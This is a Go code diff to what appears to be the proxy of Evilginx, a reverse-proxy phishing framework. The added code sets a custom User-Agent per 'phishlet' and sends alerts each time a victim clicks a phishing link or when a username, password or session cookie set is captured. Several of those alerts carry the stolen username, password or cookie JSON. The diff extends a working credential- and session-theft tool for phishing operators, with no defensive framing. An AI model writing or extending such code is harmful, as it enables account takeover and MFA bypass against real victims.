@@ -187,6 +187,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// inject custom user-agent if set
+			plet := p.getPhishletByPhishHost(req.Host)
+			originalUA := req.Header.Get("User-Agent")
+			if plet != nil {
+				customUA, ok := p.cfg.GetSiteCustomUa(plet.Name)
+				if ok && customUA != "" {
+					req.Header.Set("User-Agent", customUA)
+					log.Debug("Injected custom User-Agent for phishlet '%s': %s", plet.Name, customUA)
+				}
+			}
+
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
@@ -410,10 +421,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									sid := p.last_sid
 									p.last_sid += 1
-									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), originalUA, remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
+
+									if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+										// Send notification
+										SendNotification(pl.Name, "New link clicked!", "", p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+									}
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										rid, ok := session.Params["rid"]
@@ -764,6 +780,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									captured = true
+
+									if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+										// Send notification
+										SendNotification(pl.Name, "Username Captured!", um[1], p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+									}
 								}
 							}
 
@@ -776,6 +797,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									captured = true
+
+									if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+										// Send notification
+										SendNotification(pl.Name, "Password Captured!", pm[1], p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+									}
 								}
 							}
 
@@ -855,6 +881,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												}
 												captured = true
 											}
+
+											if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+												// Send notification
+												SendNotification(pl.Name, "Username Captured!", um[1], p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+											}
 										}
 									}
 									if pl.password.tp == "post/multipart" {
@@ -867,6 +898,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 													log.Error("database: %v", err)
 												}
 												captured = true
+											}
+
+											if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+												// Send notification
+												SendNotification(pl.Name, "Password Captured!", pm[1], p.cfg.IsSiteNotifyModeMinimal(pl.Name))
 											}
 										}
 									}
@@ -1008,6 +1044,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 													log.Error("database: %v", err)
 												}
 												captured = true
+												if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+													// Send notification
+													SendNotification(pl.Name, "Username Captured!", um[1], p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+												}
 											}
 										}
 									}
@@ -1021,6 +1061,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 													log.Error("database: %v", err)
 												}
 												captured = true
+												if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+													// Send notification
+													SendNotification(pl.Name, "Password Captured!", pm[1], p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+												}
 											}
 										}
 									}
@@ -1326,6 +1370,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						s.Finish(false)
 
 						p.ReportCapturedSession(ps.SessionId)
+						if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+							cookieJson := ModdedCookieTokensToJSON(s.CookieTokens)
+							// Send notification
+							SendNotification(pl.Name, "Session Captured!", cookieJson, p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+						}
 					}
 				}
 			}
@@ -1459,6 +1508,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 							p.ReportCapturedSession(ps.SessionId)
+							if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+								cookieJson := ModdedCookieTokensToJSON(s.CookieTokens)
+								// Send notification
+								SendNotification(pl.Name, "Session Captured!", cookieJson, p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+							}
 							break
 						}
 					}
